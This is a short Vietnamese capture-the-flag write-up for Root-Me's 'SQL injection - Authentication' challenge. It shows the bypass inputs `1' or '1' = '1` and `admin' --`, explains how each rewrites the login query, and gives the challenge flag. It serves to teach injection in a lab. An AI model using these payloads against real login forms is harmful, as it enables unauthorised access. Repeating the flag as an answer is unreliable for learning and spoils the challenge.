# [SQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication)

## Solutions

- Nhập `1' or '1' = '1` cho cả username và password:

```sql
SELECT * FROM table WHERE username = '...' AND password = '...'
```

=>

```sql
SELECT * FROM table WHERE username = '1' or '1' = '1' AND password = '1' or '1' = '1'
```

=> Lấy được `user1`

- Để lấy được `admin` thì nhập `admin' --` cho username và password bất kì là thành công

```sql
SELECT * FROM table WHERE username = '...' AND password = '...'
```

=>

```sql
SELECT * FROM table WHERE username = 'admin' --' AND password = ''
```

Flag: `t0_W34k!$`
